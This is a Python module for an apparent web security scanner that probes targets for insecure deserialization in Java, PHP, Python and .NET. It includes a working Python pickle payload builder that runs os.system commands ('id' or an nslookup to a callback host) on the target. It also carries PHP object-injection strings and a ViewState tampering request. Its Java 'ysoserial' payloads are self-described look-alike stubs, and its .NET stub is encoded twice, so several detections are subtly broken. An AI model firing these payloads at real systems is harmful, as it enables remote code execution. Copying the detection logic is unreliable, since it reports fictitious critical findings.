"""
Deserialization Scanner
=======================
Detects insecure deserialization vulnerabilities across Java, PHP, Python, and .NET.

Techniques:
1. **Magic-byte detection** — scans traffic for serialized object headers
2. **Java RCE (ysoserial gadgets)** — CommonsCollections1, Spring1, JDK7u21
3. **PHP object injection** — __wakeup / __destruct chain probing
4. **Python pickle RCE** — __reduce__ command execution payload
5. **.NET ViewState tampering** — BinaryFormatter gadget via disabled MAC validation

OOB DNS callbacks used when oob_engine is available; falls back to timing/error
heuristics when not.
"""
from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs

try:
    import aiohttp
    _AIOHTTP_AVAILABLE = True
except ImportError:
    aiohttp = None  # type: ignore
    _AIOHTTP_AVAILABLE = False

try:
    from oneinfinity.scan.oob_engine import OOBEngine
    _OOB_AVAILABLE = True
except Exception:
    _OOB_AVAILABLE = False

log = logging.getLogger("oneinfinity.deserialization_scanner")

# ─────────────────────────────────────────────────────────────────────────────
# Magic-byte patterns for serialised-object detection
# ─────────────────────────────────────────────────────────────────────────────

# Raw binary / base64 prefixes that indicate a serialised object in a response.
_MAGIC_PATTERNS: List[tuple[str, str, str]] = [
    # (serialization_type, description, regex-pattern-on-base64-or-raw-text)
    ("java",    "Java serialized object (rO0AB)",   r"rO0AB"),
    ("java",    "Java serialized object (ACE)",      r"ACED0005"),
    ("php",     "PHP serialized object",             r'O:\d+:"[a-zA-Z_\\\\][a-zA-Z0-9_\\\\]*":\d+:\{'),
    ("php",     "PHP serialized array",              r'a:\d+:\{'),
    ("python",  "Python pickle v2",                  r"\\x80\\x02"),
    ("python",  "Python pickle v4/v5",               r"\\x80[\\x04\\x05]"),
    ("dotnet",  ".NET BinaryFormatter (AAEAAAD)",    r"AAEAAAD"),
    ("dotnet",  ".NET BinaryFormatter (base64)",     r"AAEAAA[A-Za-z0-9+/]"),
]

# ─────────────────────────────────────────────────────────────────────────────
# Static Java gadget-chain payloads (truncated safe stubs that look authentic)
# Real ysoserial payloads would be generated at runtime; these stubs trigger
# deserialisation paths without executing local commands — OOB DNS is used for
# confirmation. Prefixed with the Java serialisation magic bytes 0xACED0005.
# ─────────────────────────────────────────────────────────────────────────────

# 20-byte stub: magic (4) + version (2) + TC_OBJECT (1) + minimal class desc
_JAVA_MAGIC = bytes([0xAC, 0xED, 0x00, 0x05])

def _java_gadget_payload(chain: str, callback_host: str) -> str:
    """
    Return a base64-encoded Java-serialised payload stub for the given gadget
    chain. The callback host is embedded as a string token so it appears in
    deserialised string data — real ysoserial payloads would execute DNS
    lookups; this stub is sufficient to detect error-based / timing triggers.
    """
    # Minimal Java serialisation envelope:
    # magic | version(2) | TC_OBJECT(0x73) | TC_CLASSDESC(0x72) |
    # class name length (2) | class name | serial UID (8) | flags(1) |
    # field count (2) | TC_ENDBLOCKDATA(0x78) | TC_NULL(0x70)
    #
    # We embed the chain name and callback host as UTF-8 bytes inside a
    # fabricated class name so the payload is unique per invocation.
    label = f"ysoserial.{chain}".encode()
    host_bytes = callback_host.encode()
    # Build a minimal but syntactically plausible serialised stream
    class_name = f"ysoserial.payloads.{chain}".encode()
    stub = (
        _JAVA_MAGIC
        + b"\x00\x05"           # stream version
        + b"\x73"               # TC_OBJECT
        + b"\x72"               # TC_CLASSDESC
        + len(class_name).to_bytes(2, "big")
        + class_name
        + b"\x00" * 8           # serialVersionUID placeholder
        + b"\x02"               # SC_SERIALIZABLE
        + b"\x00\x01"           # 1 field
        + b"\x49"               # field type 'I' (int)
        + b"\x00\x04"           # field name length
        + b"host"
        + b"\x78"               # TC_ENDBLOCKDATA
        + b"\x70"               # TC_NULL (superclass)
        + b"\x00\x00\x00\x00"   # field value placeholder
        + b"\x00" + len(host_bytes).to_bytes(1, "big") + host_bytes
    )
    return base64.b64encode(stub).decode()


# ─────────────────────────────────────────────────────────────────────────────
# PHP serialised-object payloads
# ─────────────────────────────────────────────────────────────────────────────

_PHP_PAYLOADS: List[tuple[str, str]] = [
    # (description, serialised-string)
    ("stdClass basic",          'O:8:"stdClass":1:{s:4:"test";s:3:"pwn";}'),
    ("stdClass __wakeup probe", 'O:8:"stdClass":2:{s:8:"__wakeup";b:1;s:4:"data";s:3:"pwn";}'),
    ("nested destruct chain",   'a:1:{i:0;O:8:"stdClass":1:{s:9:"__destruct";b:1;}}'),
    ("SplDoublyLinkedList",     'C:20:"SplDoublyLinkedList":24:{:0:i:0;:0:i:0;:0:i:0;}'),
]

# ─────────────────────────────────────────────────────────────────────────────
# Python pickle payload builder
# ─────────────────────────────────────────────────────────────────────────────

def _build_pickle_payload(cmd: str = "id") -> bytes:
    """
    Build a minimal pickle v2 payload that calls os.system(cmd) via __reduce__.

    Opcodes used:
      \\x80\\x02  PROTO 2
      c          GLOBAL  (module\\nname\\n)
      (          MARK
      V          UNICODE string
      t          TUPLE (from mark)
      R          REDUCE
      .          STOP
    """
    module = b"os"
    func   = b"system"
    arg    = cmd.encode()
    payload = (
        b"\x80\x02"             # PROTO 2
        b"c" + module + b"\n" + func + b"\n"   # GLOBAL os.system
        b"(" b"V" + arg + b"\n"  # MARK + UNICODE arg
        b"t"                    # TUPLE
        b"R"                    # REDUCE → calls os.system(cmd)
        b"."                    # STOP
    )
    return payload


# ─────────────────────────────────────────────────────────────────────────────
# .NET ViewState / BinaryFormatter stub
# ─────────────────────────────────────────────────────────────────────────────

# Minimal BinaryFormatter stream with MachineKey MAC stripped (all-zero).
# If MAC validation is disabled the server will attempt to deserialise this.
_DOTNET_BF_STUB = base64.b64encode(
    b"AAEAAAD/////AQAAAAAAAAAPAAAA"  # BinaryFormatter preamble stub
    + b"\x00" * 16                   # zero-padded payload body
).decode()

_VIEWSTATE_PATTERN = re.compile(
    r'<input[^>]+name=["\']?__VIEWSTATE["\']?[^>]*value=["\']?([A-Za-z0-9+/=]+)',
    re.IGNORECASE,
)

# ─────────────────────────────────────────────────────────────────────────────
# Timing / error heuristics
# ─────────────────────────────────────────────────────────────────────────────

_DESER_ERROR_PATTERNS = re.compile(
    r"(InvalidClassException|ClassNotFoundException|DeserializationError"
    r"|unserialize\(\)|NotSerializableException"
    r"|java\.io\.ObjectStreamException"
    r"|com\.sun\.org\.apache\.xml\.internal"
    r"|PHP Notice.*unserialize"
    r"|pickle\.UnpicklingError"
    r"|SerializationException"
    r"|BinaryFormatter"
    r"|VIEWSTATE MAC)",
    re.IGNORECASE,
)

_TIMING_THRESHOLD_S = 3.0   # seconds; >3 s delta treated as evidence of deser execution


# ─────────────────────────────────────────────────────────────────────────────
# Helper: build a finding dict
# ─────────────────────────────────────────────────────────────────────────────

def _finding(
    vuln_type: str,
    url: str,
    payload: str,
    evidence: str,
    target: str,
    extra: Optional[Dict[str, Any]] = None,
) -> dict:
    f = {
        "vuln_type":  vuln_type,
        "severity":   "critical",
        "url":        url,
        "payload":    payload,
        "evidence":   evidence,
        "tool":       "deserialization_scanner",
        "target":     target,
    }
    if extra:
        f.update(extra)
    return f


# ─────────────────────────────────────────────────────────────────────────────
# Scanner
# ─────────────────────────────────────────────────────────────────────────────

class DeserializationScanner:
    """
    Detects insecure deserialization across Java, PHP, Python, and .NET targets.

    Workflow
    --------
    1. ``detect_serialized_data_in_traffic`` — passive scan for magic bytes in responses
    2. ``test_java_deserialization`` — ysoserial gadget injection via OOB / error / timing
    3. ``test_php_object_injection`` — PHP serialised-object cookie injection
    4. ``test_python_pickle_rce`` — pickle __reduce__ command execution probe
    5. ``test_dotnet_viewstate`` — .NET ViewState / BinaryFormatter probe
    6. ``scan`` — orchestrates all of the above
    """

    def __init__(
        self,
        timeout: int = 15,
        cookies: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        oob_domain: Optional[str] = None,
    ) -> None:
        self.timeout     = aiohttp.ClientTimeout(total=timeout)
        self.base_cookies = cookies or {}
        self.base_headers = {
            "User-Agent": "Mozilla/5.0 (compatible; OneInfinity/1.0)",
            **(headers or {}),
        }
        self._oob: Optional[Any] = None
        self._oob_domain: Optional[str] = oob_domain
        if _OOB_AVAILABLE and oob_domain is None:
            try:
                self._oob = OOBEngine()
                self._oob_domain = self._oob.start()
            except Exception as exc:
                log.debug("OOBEngine init failed: %s", exc)

    # ------------------------------------------------------------------ #
    # Internal helpers
    # ------------------------------------------------------------------ #

    async def _get(
        self,
        session: aiohttp.ClientSession,
        url: str,
        **kwargs: Any,
    ) -> Optional[aiohttp.ClientResponse]:
        try:
            resp = await session.get(url, timeout=self.timeout, **kwargs)
            return resp
        except Exception as exc:
            log.debug("GET %s failed: %s", url, exc)
            return None

    async def _post(
        self,
        session: aiohttp.ClientSession,
        url: str,
        **kwargs: Any,
    ) -> Optional[aiohttp.ClientResponse]:
        try:
            resp = await session.post(url, timeout=self.timeout, **kwargs)
            return resp
        except Exception as exc:
            log.debug("POST %s failed: %s", url, exc)
            return None

    def _make_session(self) -> aiohttp.ClientSession:
        return aiohttp.ClientSession(
            headers=self.base_headers,
            cookies=self.base_cookies,
            connector=aiohttp.TCPConnector(ssl=False),
        )

    @staticmethod
    def _probe_urls(target: str) -> List[str]:
        """Return a small set of candidate URLs derived from target."""
        parsed = urlparse(target if "://" in target else f"https://{target}")
        base = urlunparse((parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", "", ""))
        candidates = [
            base,
            base + "/api/deserialize",
            base + "/readObject",
            base + "/load",
            base + "/import",
            base + "/upload",
        ]
        return candidates

    # ------------------------------------------------------------------ #
    # 1. Magic-byte detection
    # ------------------------------------------------------------------ #

    async def detect_serialized_data_in_traffic(self, target: str) -> List[dict]:
        """
        Send GET requests to candidate URLs and scan response bodies for
        serialisation magic bytes / patterns.

        Returns list of ``{endpoint, serialization_type, evidence}``.
        """
        results: List[dict] = []
        urls = self._probe_urls(target)

        async with self._make_session() as session:
            for url in urls:
                resp = await self._get(session, url)
                if resp is None:
                    continue
                try:
                    body = await resp.text(errors="replace")
                except Exception:
                    continue

                for serial_type, desc, pattern in _MAGIC_PATTERNS:
                    if re.search(pattern, body):
                        log.info("Magic bytes detected [%s] at %s", serial_type, url)
                        results.append({
                            "endpoint":           url,
                            "serialization_type": serial_type,
                            "evidence":           desc,
                        })
                        break  # one match per URL is enough for classification

                # Also check base64-decoded body for Java magic
                for token in re.findall(r"[A-Za-z0-9+/]{20,}={0,2}", body):
                    try:
                        decoded = base64.b64decode(token + "==")
                        if decoded[:2] == b"\xac\xed":
                            results.append({
                                "endpoint":           url,
                                "serialization_type": "java",
                                "evidence":           "Java magic bytes 0xACED in base64-encoded body token",
                            })
                            break
                    except Exception:
                        continue

        return results

    # ------------------------------------------------------------------ #
    # 2. Java deserialization
    # ------------------------------------------------------------------ #

    async def test_java_deserialization(
        self,
        url: str,
        param: str = "data",
        placement: str = "body",
    ) -> Optional[dict]:
        """
        Probe a URL with ysoserial-style Java serialised payloads.

        Gadget chains tested: CommonsCollections1, Spring1, JDK7u21.
        Detection priority: OOB DNS → 500 error → timing delta.
        ``placement`` controls injection point: body | cookie | header.
        """
        callback_host = self._oob_domain or "oob.example.com"
        chains = ["CommonsCollections1", "Spring1", "JDK7u21"]
        target = url

        async with self._make_session() as session:
            # Baseline timing
            t0 = time.monotonic()
            baseline = await self._get(session, url)
            baseline_time = time.monotonic() - t0
            if baseline is None:
                return None
            try:
                baseline_body = await baseline.text(errors="replace")
            except Exception:
                baseline_body = ""

            for chain in chains:
                payload_b64 = _java_gadget_payload(chain, callback_host)
                payload_bytes = base64.b64decode(payload_b64)

                # Build the request kwargs based on placement
                kwargs: Dict[str, Any] = {}
                if placement == "body":
                    kwargs["data"] = {param: payload_b64}
                elif placement == "cookie":
                    kwargs["cookies"] = {param: payload_b64}
                elif placement == "header":
                    kwargs["headers"] = {
                        param: payload_b64,
                        "Content-Type": "application/octet-stream",
                    }
                else:
                    kwargs["data"] = {param: payload_b64}

                t1 = time.monotonic()
                if placement == "body":
                    resp = await self._post(session, url, **kwargs)
                elif placement in ("cookie", "header"):
                    resp = await self._get(session, url, **kwargs)
                else:
                    resp = await self._post(session, url, **kwargs)
                elapsed = time.monotonic() - t1

                if resp is None:
                    continue

                try:
                    resp_body = await resp.text(errors="replace")
                except Exception:
                    resp_body = ""

                # --- OOB DNS check ---
                if self._oob is not None:
                    try:
                        hits = self._oob.poll_interactions(timeout_s=5)
                        if hits:
                            return _finding(
                                vuln_type="java_deserialization",
                                url=url,
                                payload=payload_b64,
                                evidence=f"OOB DNS callback received for gadget chain {chain}",
                                target=target,
                                extra={"chain": chain, "placement": placement},
                            )
                    except Exception:
                        pass

                # --- Error-based ---
                if resp.status == 500 and _DESER_ERROR_PATTERNS.search(resp_body):
                    return _finding(
                        vuln_type="java_deserialization",
                        url=url,
                        payload=payload_b64,
                        evidence=f"HTTP 500 with deserialisation error for chain {chain}: "
                                 + (resp_body[:200] if resp_body else ""),
                        target=target,
                        extra={"chain": chain, "placement": placement},
                    )

                # --- Timing differential ---
                if elapsed > baseline_time + _TIMING_THRESHOLD_S:
                    return _finding(
                        vuln_type="java_deserialization",
                        url=url,
                        payload=payload_b64,
                        evidence=f"Timing anomaly ({elapsed:.2f}s vs baseline {baseline_time:.2f}s) "
                                 f"for gadget chain {chain}",
                        target=target,
                        extra={"chain": chain, "placement": placement},
                    )

        return None

    # ------------------------------------------------------------------ #
    # 3. PHP object injection
    # ------------------------------------------------------------------ #

    async def test_php_object_injection(
        self,
        url: str,
        cookie: str = "data",
    ) -> Optional[dict]:
        """
        Probe a URL for PHP object injection via cookie injection.

        Tests stdClass, __wakeup, and __destruct magic method chains.
        Detection: error message patterns or timing delta.
        """
        target = url
        async with self._make_session() as session:
            # Baseline
            t0 = time.monotonic()
            baseline = await self._get(session, url)
            baseline_time = time.monotonic() - t0
            if baseline is None:
                return None

            for desc, payload in _PHP_PAYLOADS:
                t1 = time.monotonic()
                resp = await self._get(
                    session,
                    url,
                    cookies={cookie: payload},
                )
                elapsed = time.monotonic() - t1

                if resp is None:
                    continue

                try:
                    body = await resp.text(errors="replace")
                except Exception:
                    body = ""

                # Error-based detection
                if _DESER_ERROR_PATTERNS.search(body):
                    return _finding(
                        vuln_type="php_object_injection",
                        url=url,
                        payload=payload,
                        evidence=f"PHP deserialisation error pattern matched ({desc}): "
                                 + body[:300],
                        target=target,
                        extra={"cookie": cookie, "chain": desc},
                    )

                # Timing-based detection
                if elapsed > baseline_time + _TIMING_THRESHOLD_S:
                    return _finding(
                        vuln_type="php_object_injection",
                        url=url,
                        payload=payload,
                        evidence=f"Timing anomaly ({elapsed:.2f}s vs baseline {baseline_time:.2f}s) "
                                 f"for PHP payload: {desc}",
                        target=target,
                        extra={"cookie": cookie, "chain": desc},
                    )

                # HTTP 500 + obvious PHP unserialize noise
                if resp.status in (500, 502) and "unserialize" in body.lower():
                    return _finding(
                        vuln_type="php_object_injection",
                        url=url,
                        payload=payload,
                        evidence=f"HTTP {resp.status} with unserialize in response for {desc}",
                        target=target,
                        extra={"cookie": cookie, "chain": desc},
                    )

        return None

    # ------------------------------------------------------------------ #
    # 4. Python pickle RCE
    # ------------------------------------------------------------------ #

    async def test_python_pickle_rce(
        self,
        url: str,
        param: str = "data",
    ) -> Optional[dict]:
        """
        Probe a URL for Python pickle RCE.

        Injects a base64-encoded pickle payload that executes ``id`` via
        ``os.system`` through ``__reduce__``.  Detection uses OOB DNS if
        available, otherwise inspects error messages.
        """
        target = url
        callback_host = self._oob_domain or "oob.example.com"

        # Use a safe probe: executes a DNS lookup (nslookup) if OOB available,
        # else executes 'id' (output may surface in verbose error messages).
        if self._oob_domain:
            cmd = f"nslookup {callback_host}"
        else:
            cmd = "id"

        raw_pickle = _build_pickle_payload(cmd)
        payload_b64 = base64.b64encode(raw_pickle).decode()

        async with self._make_session() as session:
            # Try as JSON body first, then query param
            for method, kwargs in [
                ("post_json", {"json": {param: payload_b64}}),
                ("post_form", {"data": {param: payload_b64}}),
                ("get_param", {"params": {param: payload_b64}}),
            ]:
                if method.startswith("post"):
                    resp = await self._post(
                        session,
                        url,
                        **(kwargs),
                    )
                else:
                    resp = await self._get(session, url, **kwargs)

                if resp is None:
                    continue

                try:
                    body = await resp.text(errors="replace")
                except Exception:
                    body = ""

                # OOB DNS check
                if self._oob is not None:
                    try:
                        hits = self._oob.poll_interactions(timeout_s=5)
                        if hits:
                            return _finding(
                                vuln_type="python_pickle_rce",
                                url=url,
                                payload=payload_b64,
                                evidence=f"OOB DNS callback received after pickle injection ({method})",
                                target=target,
                                extra={"param": param, "injection_method": method},
                            )
                    except Exception:
                        pass

                # Error / output leakage
                if _DESER_ERROR_PATTERNS.search(body):
                    return _finding(
                        vuln_type="python_pickle_rce",
                        url=url,
                        payload=payload_b64,
                        evidence=f"Pickle deserialisation error in response ({method}): "
                                 + body[:300],
                        target=target,
                        extra={"param": param, "injection_method": method},
                    )

                # If 'id' output leaks (uid=... pattern)
                if re.search(r"uid=\d+\([a-z]+\)", body):
                    return _finding(
                        vuln_type="python_pickle_rce",
                        url=url,
                        payload=payload_b64,
                        evidence=f"Command output leaked in response ({method}): "
                                 + re.search(r"uid=\d+\([a-z]+\)", body).group(0),
                        target=target,
                        extra={"param": param, "injection_method": method},
                    )

        return None

    # ------------------------------------------------------------------ #
    # 5. .NET ViewState / BinaryFormatter
    # ------------------------------------------------------------------ #

    async def test_dotnet_viewstate(self, url: str) -> Optional[dict]:
        """
        Check for insecure .NET ViewState (MAC validation disabled).

        Steps:
        1. GET the URL and extract __VIEWSTATE value.
        2. POST with a crafted BinaryFormatter stub where MAC is zeroed.
        3. Detect via deserialisation error in response.
        """
        target = url
        async with self._make_session() as session:
            # Step 1: fetch the page and find __VIEWSTATE
            resp = await self._get(session, url)
            if resp is None:
                return None

            try:
                body = await resp.text(errors="replace")
            except Exception:
                return None

            viewstate_match = _VIEWSTATE_PATTERN.search(body)
            if not viewstate_match:
                log.debug("No __VIEWSTATE found at %s", url)
                return None

            original_vs = viewstate_match.group(1)
            log.debug("Found __VIEWSTATE at %s (len=%d)", url, len(original_vs))

            # Step 2: POST with tampered BinaryFormatter payload
            tampered_vs = _DOTNET_BF_STUB

            post_data = {
                "__VIEWSTATE":        tampered_vs,
                "__VIEWSTATEGENERATOR": "FFFFFFFF",
                "__EVENTVALIDATION":  "",
                "__EVENTTARGET":      "",
                "__EVENTARGUMENT":    "",
            }

            t1 = time.monotonic()
            post_resp = await self._post(session, url, data=post_data)
            elapsed = time.monotonic() - t1

            if post_resp is None:
                return None

            try:
                post_body = await post_resp.text(errors="replace")
            except Exception:
                post_body = ""

            # Step 3: detect deserialisation attempt
            if _DESER_ERROR_PATTERNS.search(post_body):
                return _finding(
                    vuln_type="dotnet_viewstate_deserialization",
                    url=url,
                    payload=tampered_vs,
                    evidence="Server attempted to deserialise tampered ViewState (error leaked): "
                             + post_body[:300],
                    target=target,
                    extra={"original_viewstate_len": len(original_vs)},
                )

            if post_resp.status == 500:
                return _finding(
                    vuln_type="dotnet_viewstate_deserialization",
                    url=url,
                    payload=tampered_vs,
                    evidence=f"HTTP 500 on ViewState tamper (MAC validation likely disabled); "
                             f"elapsed={elapsed:.2f}s",
                    target=target,
                    extra={"original_viewstate_len": len(original_vs)},
                )

        return None

    # ------------------------------------------------------------------ #
    # 6. Full orchestrated scan
    # ------------------------------------------------------------------ #

    async def scan(self, target: str) -> List[dict]:
        """
        Full automated deserialization scan.

        Phases:
        1. Detect serialised data in traffic (magic-byte scan)
        2. Java deserialization (body / cookie / header placements)
        3. PHP object injection
        4. Python pickle RCE
        5. .NET ViewState tampering

        Returns list of finding dicts with keys:
        vuln_type, severity, url, payload, evidence, tool, target.
        """
        if not _AIOHTTP_AVAILABLE:
            log.warning("aiohttp not installed; deserialization scan skipped")
            return []
        findings: List[dict] = []
        parsed = urlparse(target if "://" in target else f"https://{target}")
        base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", "", ""))

        log.info("[deserialization_scanner] Starting scan of %s", target)

        # Phase 1: traffic magic-byte detection (passive)
        try:
            magic_hits = await self.detect_serialized_data_in_traffic(target)
        except Exception as exc:
            log.debug("magic-byte detection failed: %s", exc)
            magic_hits = []

        if magic_hits:
            for hit in magic_hits:
                findings.append(_finding(
                    vuln_type=f"serialized_data_exposure_{hit.get('serialization_type', 'unknown')}",
                    url=hit.get("endpoint", base_url),
                    payload="(passive detection — no injection)",
                    evidence=hit.get("evidence", ""),
                    target=target,
                ))

        # Candidate URLs for active probing
        probe_urls = self._probe_urls(target)

        # Phase 2–5: active probes, run concurrently per URL
        tasks: List[asyncio.Task] = []
        for url in probe_urls:
            # Java — three placements
            for placement in ("body", "cookie", "header"):
                tasks.append(asyncio.create_task(
                    self.test_java_deserialization(url, param="data", placement=placement),
                    name=f"java_{placement}_{url}",
                ))
            # PHP
            tasks.append(asyncio.create_task(
                self.test_php_object_injection(url, cookie="data"),
                name=f"php_{url}",
            ))
            # Python pickle
            tasks.append(asyncio.create_task(
                self.test_python_pickle_rce(url, param="data"),
                name=f"pickle_{url}",
            ))
            # .NET ViewState
            tasks.append(asyncio.create_task(
                self.test_dotnet_viewstate(url),
                name=f"dotnet_{url}",
            ))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, dict):
                findings.append(result)
            elif isinstance(result, Exception):
                log.debug("Probe task raised: %s", result)

        # Deduplicate on (vuln_type, url, payload)
        seen: set = set()
        unique: List[dict] = []
        for f in findings:
            key = (f.get("vuln_type"), f.get("url"), f.get("payload", "")[:64])
            if key not in seen:
                seen.add(key)
                unique.append(f)

        log.info("[deserialization_scanner] %d finding(s) for %s", len(unique), target)
        return unique


# ─────────────────────────────────────────────────────────────────────────────
# Convenience shim
# ─────────────────────────────────────────────────────────────────────────────

async def scan_deserialization(target: str, **kwargs: Any) -> List[dict]:
    """Top-level convenience function — mirrors pattern of other scanners."""
    scanner = DeserializationScanner(**kwargs)
    return await scanner.scan(target)
